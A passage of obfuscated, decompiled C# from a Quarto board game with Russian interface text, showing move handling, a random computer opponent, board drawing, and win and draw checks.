						num = (int)((num2 * 1491752975) ^ 0x23C9AF9A);
						continue;
					}
					num7 = 0;
					goto IL_020e;
				case 11u:
					num = ((int)num2 * -763331137) ^ -1061916530;
					continue;
				case 10u:
					Form1.smethod_45(graphics_);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1893595530) ^ 0x47422EEC;
					continue;
				case 9u:
					num = (int)((num2 * 593089219) ^ 0x60F7B96E);
					continue;
				case 8u:
					num6 = Form1.smethod_38(e) / size;
					num5 = Form1.smethod_39(e) / size;
					num = (int)(num2 * 642521711) ^ -1135746181;
					continue;
				case 7u:
				{
					int num12;
					int num13;
					if (!flag2)
					{
						num12 = -315031895;
						num13 = -315031895;
					}
					else
					{
						num12 = -898112185;
						num13 = -898112185;
					}
					num = num12 ^ (int)(num2 * 424726236);
					continue;
				}
				case 6u:
					Paint_Board();
					num = (int)((num2 * 1582831875) ^ 0x672B63B);
					continue;
				case 5u:
				{
					int num8;
					int num9;
					if (flag3)
					{
						num8 = 1348131998;
						num9 = 1348131998;
					}
					else
					{
						num8 = 468175030;
						num9 = 468175030;
					}
					num = num8 ^ ((int)num2 * -774467822);
					continue;
				}
				case 4u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num6 * size + 4, num5 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -385812042) ^ 0x75B7B96D;
					continue;
				case 3u:
					num7 = ((board[num5, num6] == null) ? 1 : 0);
					goto IL_020e;
				case 2u:
					flag3 = num4 < 4;
					num = -267839694;
					continue;
				case 1u:
					flag2 = Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Blue;
					num = -1805612196;
					continue;
				case 0u:
					flag = num3 < 4;
					num = -1115860070;
					continue;
				default:
					return;
				case 20u:
					break;
				case 27u:
					return;
					IL_020e:
					flag4 = (byte)num7 != 0;
					num = -1110566351;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0bc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf6: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		int num4 = default(int);
		int num29 = default(int);
		int num30 = default(int);
		int num31 = default(int);
		bool flag3 = default(bool);
		int num3 = default(int);
		int num6 = default(int);
		bool flag7 = default(bool);
		int num23 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		Figurine[,] array2 = default(Figurine[,]);
		int num18 = default(int);
		int num19 = default(int);
		bool flag4 = default(bool);
		int num9 = default(int);
		int num24 = default(int);
		int num40 = default(int);
		int num12 = default(int);
		int num36 = default(int);
		int num35 = default(int);
		int num11 = default(int);
		int num20 = default(int);
		bool flag8 = default(bool);
		bool flag13 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		bool flag9 = default(bool);
		bool flag5 = default(bool);
		bool flag11 = default(bool);
		bool flag12 = default(bool);
		int num25 = default(int);
		Graphics graphics_ = default(Graphics);
		int num10 = default(int);
		int num7 = default(int);
		bool flag15 = default(bool);
		bool flag14 = default(bool);
		bool flag2 = default(bool);
		int num5 = default(int);
		bool flag10 = default(bool);
		bool flag = default(bool);
		bool flag6 = default(bool);
		while (true)
		{
			int num = 11582699;
			while (true)
			{
				uint num2;
				int num34;
				int num8;
				int num39;
				int num13;
				switch ((num2 = (uint)num ^ 0xBB6A462u) % 171u)
				{
				case 170u:
					board[num4, num29] = new Figurine(storage[num30, num31]);
					storage[num30, num31] = null;
					num = ((int)num2 * -1142381485) ^ -495686145;
					continue;
				case 169u:
					num = (int)((num2 * 331072719) ^ 0x6D5AAEDB);
					continue;
				case 168u:
					num = ((int)num2 * -1592697264) ^ 0x20601275;
					continue;
				case 167u:
					flag3 = true;
					num = (int)(num2 * 2031640365) ^ -639406265;
					continue;
				case 166u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -453074494) ^ -1942136267;
					continue;
				case 165u:
					num = ((int)num2 * -1492082013) ^ 0x66E15DC8;
					continue;
				case 164u:
					Form1.smethod_30((Control)(object)borderBox[num3, num6]);
					num = (int)((num2 * 1561213135) ^ 0x68B4EA38);
					continue;
				case 163u:
					flag7 = num23 < 4;
					num = 335883101;
					continue;
				case 162u:
					num = ((int)num2 * -598413556) ^ 0x564828B9;
					continue;
				case 161u:
					num30 = num3;
					num31 = num6;
					num = ((int)num2 * -588940730) ^ 0x6F409050;
					continue;
				case 160u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array2);
					num = ((int)num2 * -1148813519) ^ 0x56A705BA;
					continue;
				case 159u:
					num31 = 0;
					num4 = 0;
					num29 = 0;
					num = (int)(num2 * 775512413) ^ -1867086896;
					continue;
				case 158u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1399718946) ^ -2122419629;
					continue;
				case 157u:
					if (!Standoff(board))
					{
						num = 188923870;
						num34 = 188923870;
						continue;
					}
					goto IL_01b3;
				case 156u:
					Form1.smethod_30((Control)(object)borderBox[num18, num19]);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)(num2 * 692852689) ^ -1703660565;
					continue;
				case 155u:
					num6++;
					num = 1592230592;
					continue;
				case 154u:
					num = (int)((num2 * 210520195) ^ 0xABE6405);
					continue;
				case 153u:
					num = ((int)num2 * -818746976) ^ -1411807839;
					continue;
				case 152u:
					num23++;
					num = (int)((num2 * 923558484) ^ 0x526AF993);
					continue;
				case 151u:
					flag4 = num9 < 4;
					num = 1659314309;
					continue;
				case 150u:
					num = (int)((num2 * 1312202152) ^ 0x6EF2DAD5);
					continue;
				case 149u:
				{
					int num63;
					if (num24 >= 4)
					{
						num = 1903548645;
						num63 = 1903548645;
					}
					else
					{
						num = 1200570963;
						num63 = 1200570963;
					}
					continue;
				}
				case 148u:
					num8 = ((num40 < 9) ? 1 : 0);
					goto IL_0296;
				case 147u:
					num = ((int)num2 * -1258093430) ^ 0x7B0AAA;
					continue;
				case 146u:
					num39 = ((num19 == num12) ? 1 : 0);
					goto IL_02bb;
				case 145u:
					num = (int)((num2 * 1191559466) ^ 0x4EFABFA2);
					continue;
				case 144u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num36, num35] = new Figurine(storage[num11, num12]);
					num = (int)((num2 * 287795359) ^ 0x4E6C5EA0);
					continue;
				case 143u:
					num = (int)((num2 * 281530981) ^ 0x5225FED0);
					continue;
				case 142u:
					Form1.smethod_5((Control)(object)borderBox[num20, num9], Color.LimeGreen);
					num = ((int)num2 * -1479009212) ^ 0x3592D1B8;
					continue;
				case 141u:
				{
					int num53;
					int num54;
					if (!flag8)
					{
						num53 = 1894920768;
						num54 = 1894920768;
					}
					else
					{
						num53 = 79626605;
						num54 = 79626605;
					}
					num = num53 ^ ((int)num2 * -1467574197);
					continue;
				}
				case 140u:
					num = 816539665;
					continue;
				case 139u:
					num9++;
					num = (int)(num2 * 756609389) ^ -1792564020;
					continue;
				case 138u:
					num = (int)(num2 * 530834521) ^ -1444682657;
					continue;
				case 137u:
					num11 = 0;
					num12 = 0;
					num = ((int)num2 * -1888901405) ^ 0x5F105F2C;
					continue;
				case 136u:
				{
					int num46;
					int num47;
					if (flag13)
					{
						num46 = -357153497;
						num47 = -357153497;
					}
					else
					{
						num46 = -1434566902;
						num47 = -1434566902;
					}
					num = num46 ^ (int)(num2 * 802945175);
					continue;
				}
				case 135u:
					num13 = (Standoff(array) ? 1 : 0);
					goto IL_0406;
				case 134u:
					num9 = 0;
					num = 632282955;
					continue;
				case 133u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1404496175) ^ 0x5B7B849A;
					continue;
				case 132u:
					num19 = Form1.smethod_33(rnd, 4);
					if (storage[num18, num19] != null)
					{
						num = ((int)num2 * -1781155605) ^ -1772967187;
						continue;
					}
					num39 = 1;
					goto IL_02bb;
				case 131u:
					if (num18 == num11)
					{
						num = (int)(num2 * 1501927538) ^ -378743900;
						continue;
					}
					num39 = 0;
					goto IL_02bb;
				case 130u:
					num = ((int)num2 * -1659000524) ^ 0x7260C613;
					continue;
				case 129u:
					step++;
					num = 310854625;
					continue;
				case 128u:
				{
					int num27;
					int num28;
					if (!flag9)
					{
						num27 = -1390922617;
						num28 = -1390922617;
					}
					else
					{
						num27 = -1710477969;
						num28 = -1710477969;
					}
					num = num27 ^ (int)(num2 * 559598734);
					continue;
				}
				case 127u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -181788001) ^ 0x7F6D76F9;
					continue;
				case 126u:
					num = ((int)num2 * -1731349880) ^ -1251740593;
					continue;
				case 125u:
					num = ((int)num2 * -2097985587) ^ -199454621;
					continue;
				case 124u:
				{
					int num14;
					int num15;
					if (!flag5)
					{
						num14 = -11759792;
						num15 = -11759792;
					}
					else
					{
						num14 = -1794601242;
						num15 = -1794601242;
					}
					num = num14 ^ (int)(num2 * 1952716367);
					continue;
				}
				case 123u:
					num = (int)((num2 * 1365471948) ^ 0x13F6412E);
					continue;
				case 122u:
				{
					int num66;
					int num67;
					if (!flag11)
					{
						num66 = -870346877;
						num67 = -870346877;
					}
					else
					{
						num66 = -1970894751;
						num67 = -1970894751;
					}
					num = num66 ^ (int)(num2 * 1629035063);
					continue;
				}
				case 121u:
					num = (int)((num2 * 579282455) ^ 0x1403BC73);
					continue;
				case 120u:
					Form1.smethod_15(timer1);
					num = 1475311056;
					continue;
				case 119u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					step++;
					num = ((int)num2 * -843234246) ^ 0x10C6B0C7;
					continue;
				case 118u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = ((int)num2 * -63498109) ^ 0x600BB93A;
					continue;
				case 117u:
				{
					int num64;
					int num65;
					if (!flag12)
					{
						num64 = -515903290;
						num65 = -515903290;
					}
					else
					{
						num64 = -2017121331;
						num65 = -2017121331;
					}
					num = num64 ^ (int)(num2 * 131614079);
					continue;
				}
				case 116u:
					num = ((int)num2 * -192168850) ^ 0x58AD84B7;
					continue;
				case 115u:
					Form1.smethod_5((Control)(object)borderBox[num3, num6], Color.White);
					num = (int)((num2 * 1002736095) ^ 0x1BC3A7C6);
					continue;
				case 114u:
					array3[num23, num25] = new Figurine(storage[num18, num19]);
					num = ((int)num2 * -1556732233) ^ -2029051203;
					continue;
				case 113u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num10 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1117778791) ^ 0x7527903C;
					continue;
				case 112u:
					Form1.smethod_20(pictureBox[num3, num6], (Image)null);
					num = (int)(num2 * 625232508) ^ -1177006260;
					continue;
				case 111u:
					num29 = num6;
					num = ((int)num2 * -1015123420) ^ 0x4507AF03;
					continue;
				case 110u:
					num = ((int)num2 * -1199557537) ^ 0x49E539B5;
					continue;
				case 109u:
					num10 = 0;
					num = 709273081;
					continue;
				case 108u:
				{
					int num61;
					int num62;
					if (flag4)
					{
						num61 = -1345846560;
						num62 = -1345846560;
					}
					else
					{
						num61 = -1049057848;
						num62 = -1049057848;
					}
					num = num61 ^ (int)(num2 * 1831230613);
					continue;
				}
				case 107u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num11, num12]), num10 * size + 4, num7 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 1153701947) ^ 0x3B8640D6);
					continue;
				case 106u:
					flag15 = Form1.smethod_41((Control)(object)borderBox[num3, num6]) == Color.Blue;
					num = ((int)num2 * -840190868) ^ -10743453;
					continue;
				case 105u:
					flag14 = num20 < 4;
					num = 699356840;
					continue;
				case 104u:
					board[num7, num10] = new Figurine(storage[num11, num12]);
					num = (int)((num2 * 989629809) ^ 0x47995311);
					continue;
				case 103u:
					flag13 = board[num36, num35] != null;
					num = (int)(num2 * 1036995884) ^ -1152883208;
					continue;
				case 102u:
					board[num36, num35] = new Figurine(storage[num11, num12]);
					num = ((int)num2 * -2077431405) ^ -1282025574;
					continue;
				case 101u:
					num = 1234311825;
					continue;
				case 100u:
					Form1.smethod_20(pictureBox[num11, num12], (Image)null);
					num = ((int)num2 * -757141976) ^ -1327291958;
					continue;
				case 99u:
				{
					int num60;
					if (Standoff(board))
					{
						num = 11358108;
						num60 = 11358108;
					}
					else
					{
						num = 791944933;
						num60 = 791944933;
					}
					continue;
				}
				case 98u:
					num = ((int)num2 * -1010541803) ^ -609289508;
					continue;
				case 97u:
				{
					int num59;
					if (num3 >= 4)
					{
						num = 1947028598;
						num59 = 1947028598;
					}
					else
					{
						num = 2146948407;
						num59 = 2146948407;
					}
					continue;
				}
				case 96u:
				{
					int num57;
					int num58;
					if (!flag2)
					{
						num57 = 1534345270;
						num58 = 1534345270;
					}
					else
					{
						num57 = 52016416;
						num58 = 52016416;
					}
					num = num57 ^ ((int)num2 * -238023844);
					continue;
				}
				case 95u:
					storage[num11, num12] = null;
					num = (int)((num2 * 1546178093) ^ 0x486A3912);
					continue;
				case 94u:
					num20++;
					num = ((int)num2 * -596305363) ^ -208360590;
					continue;
				case 93u:
				{
					int num55;
					int num56;
					if (Stop(array3))
					{
						num55 = 82860053;
						num56 = 82860053;
					}
					else
					{
						num55 = 29874476;
						num56 = 29874476;
					}
					num = num55 ^ ((int)num2 * -162652048);
					continue;
				}
				case 92u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num30 = 0;
					num = (int)((num2 * 2071631055) ^ 0x2DAB126A);
					continue;
				case 91u:
					num = (int)(num2 * 275757) ^ -1749070637;
					continue;
				case 90u:
					num40++;
					flag3 = false;
					num = (int)(num2 * 1987695944) ^ -1863702715;
					continue;
				case 89u:
					Form1.smethod_7((Control)(object)pictureBox[num24, num5], bool_0: true);
					num = 2036196623;
					continue;
				case 88u:
				{
					int num51;
					int num52;
					if (flag15)
					{
						num51 = -1138977176;
						num52 = -1138977176;
					}
					else
					{
						num51 = -488507460;
						num52 = -488507460;
					}
					num = num51 ^ ((int)num2 * -1245293241);
					continue;
				}
				case 87u:
					num25++;
					num = 786653061;
					continue;
				case 86u:
					num = ((int)num2 * -889429281) ^ 0x427DF65A;
					continue;
				case 85u:
					num24++;
					num = (int)(num2 * 1746564722) ^ -836853795;
					continue;
				case 84u:
				{
					int num50;
					if (board[num7, num10] == null)
					{
						num = 1613642290;
						num50 = 1613642290;
					}
					else
					{
						num = 866827817;
						num50 = 866827817;
					}
					continue;
				}
				case 83u:
				{
					int num48;
					int num49;
					if (flag14)
					{
						num48 = -136508665;
						num49 = -136508665;
					}
					else
					{
						num48 = -109123908;
						num49 = -109123908;
					}
					num = num48 ^ ((int)num2 * -262365049);
					continue;
				}
				case 82u:
					Paint_Board();
					num = (int)(num2 * 644408248) ^ -1610438715;
					continue;
				case 81u:
					num = (int)((num2 * 2125470608) ^ 0x4071AEB1);
					continue;
				case 80u:
					Form1.smethod_20(pictureBox[num11, num12], (Image)null);
					num = (int)(num2 * 2028403528) ^ -1157542462;
					continue;
				case 79u:
					num = ((int)num2 * -2036839513) ^ -286145049;
					continue;
				case 78u:
					Form1.smethod_30((Control)(object)borderBox[num11, num12]);
					num = (int)((num2 * 214297336) ^ 0x13F364BC);
					continue;
				case 76u:
					num = (int)((num2 * 872550242) ^ 0x434B6F7A);
					continue;
				case 74u:
					flag10 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num6 * size + size / 2, (int)(((float)num3 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = 1093891953;
					continue;
				case 73u:
					num6 = 0;
					num = 1592230592;
					continue;
				case 72u:
					num = (int)(num2 * 406497370) ^ -701495391;
					continue;
				case 71u:
					Form1.smethod_30((Control)(object)pictureBox[num11, num12]);
					num = (int)(num2 * 2096669246) ^ -765802663;
					continue;
				case 70u:
					num = 278647955;
					continue;
				case 69u:
					num25 = 0;
					num = 786653061;
					continue;
				case 68u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num7 = 0;
					num = ((int)num2 * -1897429696) ^ 0x63CD11FA;
					continue;
				case 67u:
					num5 = 0;
					num = 163806126;
					continue;
				case 66u:
					num3 = 0;
					num = ((int)num2 * -71062499) ^ 0x64E5920A;
					continue;
				case 65u:
					num36 = Form1.smethod_33(rnd, 4);
					num35 = Form1.smethod_33(rnd, 4);
					num = 1161572462;
					continue;
				case 64u:
					num = 866827817;
					continue;
				case 63u:
					num = (int)((num2 * 913669685) ^ 0x1AF7605E);
					continue;
				case 62u:
					num10++;
					num = 709273081;
					continue;
				case 61u:
				{
					int num44;
					int num45;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num44 = 415995547;
						num45 = 415995547;
					}
					else
					{
						num44 = 2016343675;
						num45 = 2016343675;
					}
					num = num44 ^ (int)(num2 * 805870035);
					continue;
				}
				case 60u:
				{
					int num42;
					int num43;
					if (flag)
					{
						num42 = -2139486951;
						num43 = -2139486951;
					}
					else
					{
						num42 = -866916826;
						num43 = -866916826;
					}
					num = num42 ^ ((int)num2 * -311577323);
					continue;
				}
				case 59u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)((num2 * 944382000) ^ 0x4826A935);
					continue;
				case 58u:
				{
					int num41;
					if (num25 < 4)
					{
						num = 1243215972;
						num41 = 1243215972;
					}
					else
					{
						num = 927265627;
						num41 = 927265627;
					}
					continue;
				}
				case 57u:
					num40 = 0;
					num = (int)((num2 * 1177587566) ^ 0x25DB5A18);
					continue;
				case 56u:
					num = (int)(num2 * 1389328708) ^ -376619089;
					continue;
				case 55u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 339377540) ^ -1864829361;
					continue;
				case 54u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -685142695) ^ 0x5D447FA;
					continue;
				case 53u:
					num11 = num20;
					num12 = num9;
					num = ((int)num2 * -108641728) ^ 0x1668E7DE;
					continue;
				case 52u:
					num = 797051656;
					continue;
				case 51u:
					num = (int)(num2 * 929747795) ^ -1025005850;
					continue;
				case 50u:
					storage[num11, num12] = null;
					Form1.smethod_5((Control)(object)borderBox[num18, num19], Color.Blue);
					num = (int)((num2 * 1405143462) ^ 0x78D079F9);
					continue;
				case 49u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num11, num12]), num35 * size + 4, num36 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1730729270) ^ -317607048;
					continue;
				case 48u:
					num = 1342996059;
					continue;
				case 47u:
					num = (int)((num2 * 1863582118) ^ 0x7D6C9D68);
					continue;
				case 46u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1450646705) ^ 0x1A36B598;
					continue;
				case 45u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num6]);
					num = (int)((num2 * 214312585) ^ 0x14D0FCC7);
					continue;
				case 44u:
					Form1.smethod_47(1000);
					num = (int)(num2 * 299126952) ^ -1527420357;
					continue;
				case 43u:
					num = 2029809250;
					continue;
				case 42u:
					num7++;
					num = (int)((num2 * 1473995059) ^ 0x49239534);
					continue;
				case 41u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num11, num12], Color.White);
					num = ((int)num2 * -580828610) ^ -69027875;
					continue;
				case 40u:
					num = ((int)num2 * -1648814884) ^ -693934671;
					continue;
				case 39u:
					num = (int)(num2 * 1604786068) ^ -651053218;
					continue;
				case 38u:
				{
					int num37;
					int num38;
					if (Standoff(board))
					{
						num37 = 1114902320;
						num38 = 1114902320;
					}
					else
					{
						num37 = 1431923896;
						num38 = 1431923896;
					}
					num = num37 ^ ((int)num2 * -323855367);
					continue;
				}
				case 37u:
					Form1.smethod_30((Control)(object)borderBox[num20, num9]);
					num = (int)(num2 * 413853662) ^ -1388003217;
					continue;
				case 36u:
					flag12 = num5 < 4;
					num = 2067275632;
					continue;
				case 35u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1635678861) ^ 0x3A30834A;
					continue;
				case 34u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num35 + 0.05f) * (float)size, ((float)num36 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 1590432191) ^ 0xE51D11C);
					continue;
				case 33u:
					num = (int)(num2 * 1079805539) ^ -1954389028;
					continue;
				case 32u:
					num = (int)(num2 * 618573529) ^ -855167071;
					continue;
				case 31u:
					num = (int)((num2 * 256674519) ^ 0x79FD555A);
					continue;
				case 30u:
					if (!Stop(board))
					{
						num = (int)((num2 * 272582334) ^ 0x5040C93B);
						continue;
					}
					goto IL_01b3;
				case 29u:
					num = 657741857;
					continue;
				case 28u:
					flag11 = Form1.smethod_41((Control)(object)borderBox[num20, num9]) == Color.Red;
					num = (int)(num2 * 738402329) ^ -1638695726;
					continue;
				case 27u:
					Form1.smethod_7((Control)(object)pictureBox[num20, num9], bool_0: false);
					num = ((int)num2 * -462591430) ^ 0x2733F5E8;
					continue;
				case 26u:
					num = (int)((num2 * 723943397) ^ 0x3DF03496);
					continue;
				case 25u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1542036989) ^ -1965782207;
					continue;
				case 24u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -837811299) ^ 0x296A78C0;
					continue;
				case 23u:
				{
					int num32;
					int num33;
					if (flag10)
					{
						num32 = 1607300052;
						num33 = 1607300052;
					}
					else
					{
						num32 = 1477635181;
						num33 = 1477635181;
					}
					num = num32 ^ (int)(num2 * 1296698654);
					continue;
				}
				case 22u:
					num3++;
					num = (int)((num2 * 1219453350) ^ 0x28383AF6);
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -539980463) ^ 0x42E0F669;
					continue;
				case 20u:
					num = ((int)num2 * -112666551) ^ -112050913;
					continue;
				case 19u:
					Form1.smethod_5((Control)(object)borderBox[num11, num12], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num11, num12]);
					num = (int)(num2 * 1941968191) ^ -54191953;
					continue;
				case 18u:
				{
					int num26;
					if (num10 < 4)
					{
						num = 1224701867;
						num26 = 1224701867;
					}
					else
					{
						num = 649343576;
						num26 = 649343576;
					}
					continue;
				}
				case 17u:
					flag8 = array2[num23, num25] == null;
					num = 936325667;
					continue;
				case 16u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 705757421;
					continue;
				case 15u:
					num24 = 0;
					num = ((int)num2 * -1573545086) ^ 0x5CE5F107;
					continue;
				case 14u:
					num23 = 0;
					num = ((int)num2 * -1338865241) ^ -27125039;
					continue;
				case 13u:
					num = 1177136971;
					continue;
				case 12u:
					Form1.smethod_30((Control)(object)pictureBox[num11, num12]);
					num = (int)((num2 * 903631440) ^ 0x6787681E);
					continue;
				case 11u:
				{
					int num21;
					int num22;
					if (!flag7)
					{
						num21 = -1942814653;
						num22 = -1942814653;
					}
					else
					{
						num21 = -2144815207;
						num22 = -2144815207;
					}
					num = num21 ^ (int)(num2 * 809832198);
					continue;
				}
				case 10u:
					num18 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1475021759) ^ -1878669553;
					continue;
				case 9u:
					num20 = 0;
					num = (int)((num2 * 221797978) ^ 0x76CCCBBD);
					continue;
				case 8u:
				{
					int num16;
					int num17;
					if (flag6)
					{
						num16 = -1941481636;
						num17 = -1941481636;
					}
					else
					{
						num16 = -1655886658;
						num17 = -1655886658;
					}
					num = num16 ^ (int)(num2 * 1043478714);
					continue;
				}
				case 7u:
					array[num7, num10] = new Figurine(storage[num11, num12]);
					if (!Stop(array))
					{
						num = ((int)num2 * -210847009) ^ -347055445;
						continue;
					}
					num13 = 1;
					goto IL_0406;
				case 6u:
					if (!flag3)
					{
						num = (int)(num2 * 1641895900) ^ -2014213075;
						continue;
					}
					num8 = 1;
					goto IL_0296;
				case 5u:
					flag2 = num7 < 4;
					num = 261089067;
					continue;
				case 4u:
					num = ((int)num2 * -2005503434) ^ -1351728429;
					continue;
				case 3u:
					flag = num6 < 4;
					num = 1947229928;
					continue;
				case 2u:
					num5++;
					num = (int)((num2 * 1609120384) ^ 0x2BE1AAAE);
					continue;
				case 1u:
					num4 = num3;
					num = (int)(num2 * 1717245866) ^ -819688497;
					continue;
				case 0u:
					num = (int)(num2 * 1306120929) ^ -1692960271;
					continue;
				default:
					return;
				case 75u:
					break;
				case 77u:
					return;
					IL_01b3:
					num = 1035327168;
					num34 = 1035327168;
					continue;
					IL_0406:
					flag9 = (byte)num13 != 0;
					num = 191743897;
					continue;
					IL_02bb:
					flag6 = (byte)num39 != 0;
					num = 1619930196;
					continue;
					IL_0296:
					flag5 = (byte)num8 != 0;
					num = 649581360;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num5 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 1918520533;
			while (true)
			{
				uint num2;
				int num11;
				int num26;
				switch ((num2 = (uint)num ^ 0x1571E0ECu) % 76u)
				{
				case 75u:
					num = 1789382323;
					continue;
				case 74u:
					if (mem[2, num5] != null)
					{
						num = ((int)num2 * -437057649) ^ -1534906512;
						continue;
					}
					goto IL_002d;
				case 73u:
					if (mem[0, 3] != null)
					{
						num = 434432893;
						continue;
					}
					goto IL_0050;
				case 72u:
				{
					int num55;
					int num56;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num55 = -1680488873;
						num56 = -1680488873;
					}
					else
					{
						num55 = -2106707609;
						num56 = -2106707609;
					}
					num = num55 ^ ((int)num2 * -1276977493);
					continue;
				}
				case 71u:
					num = 1026311680;
					continue;
				case 70u:
				{
					int num36;
					int num37;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num36 = -804956072;
						num37 = -804956072;
					}
					else
					{
						num36 = -1089479893;
						num37 = -1089479893;
					}
					num = num36 ^ (int)(num2 * 468773090);
					continue;
				}
				case 69u:
					flag = true;
					num = ((int)num2 * -60879305) ^ -793693140;
					continue;
				case 68u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = ((int)num2 * -459112083) ^ -309335738;
						continue;
					}
					goto IL_013c;
				case 67u:
				{
					int num61;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = 1810183069;
						num61 = 1810183069;
					}
					else
					{
						num = 535295785;
						num61 = 535295785;
					}
					continue;
				}
				case 66u:
					if (mem[1, num5] != null)
					{
						num = (int)((num2 * 1345332921) ^ 0x48AFA1C8);
						continue;
					}
					goto IL_002d;
				case 65u:
				{
					int num46;
					int num47;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num46 = -235477360;
						num47 = -235477360;
					}
					else
					{
						num46 = -194156690;
						num47 = -194156690;
					}
					num = num46 ^ ((int)num2 * -2113678167);
					continue;
				}
				case 64u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1149350207;
						continue;
					}
					goto IL_0050;
				case 63u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = ((int)num2 * -1692029863) ^ -295428914;
						continue;
					}
					goto IL_013c;
				case 62u:
					if (mem[2, 1].Square != mem[3, 0].Square)
					{
						goto IL_0050;
					}
					goto IL_005c;
				case 61u:
				{
					int num14;
					int num15;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num14 = 1518540554;
						num15 = 1518540554;
					}
					else
					{
						num14 = 555774765;
						num15 = 555774765;
					}
					num = num14 ^ ((int)num2 * -388495109);
					continue;
				}
				case 60u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -1255399135) ^ -625253136;
						continue;
					}
					goto IL_005c;
				case 59u:
				{
					int num66;
					if (mem[0, num5].Point != mem[1, num5].Point)
					{
						num = 455728718;
						num66 = 455728718;
					}
					else
					{
						num = 2140350991;
						num66 = 2140350991;
					}
					continue;
				}
				case 58u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = (int)(num2 * 373618396) ^ -1903758493;
						continue;
					}
					goto IL_0337;
				case 57u:
				{
					int num53;
					int num54;
					if (!flag2)
					{
						num53 = 591286207;
						num54 = 591286207;
					}
					else
					{
						num53 = 862361849;
						num54 = 862361849;
					}
					num = num53 ^ (int)(num2 * 708258136);
					continue;
				}
				case 55u:
				{
					int num38;
					int num39;
					if (mem[num5, 0] != null)
					{
						num38 = -830140337;
						num39 = -830140337;
					}
					else
					{
						num38 = -1449079881;
						num39 = -1449079881;
					}
					num = num38 ^ ((int)num2 * -1683511680);
					continue;
				}
				case 54u:
				{
					int num31;
					int num32;
					if (mem[num5, 1].Big != mem[num5, 2].Big)
					{
						num31 = -706152755;
						num32 = -706152755;
					}
					else
					{
						num31 = -967047721;
						num32 = -967047721;
					}
					num = num31 ^ ((int)num2 * -1522155798);
					continue;
				}
				case 53u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = ((int)num2 * -600413836) ^ 0x3D0B3DFA;
						continue;
					}
					goto IL_013c;
				case 52u:
					flag = true;
					num = (int)(num2 * 947142121) ^ -444573569;
					continue;
				case 51u:
					if (mem[0, num5] != null)
					{
						num = 275225478;
						continue;
					}
					goto IL_002d;
				case 50u:
				{
					int num16;
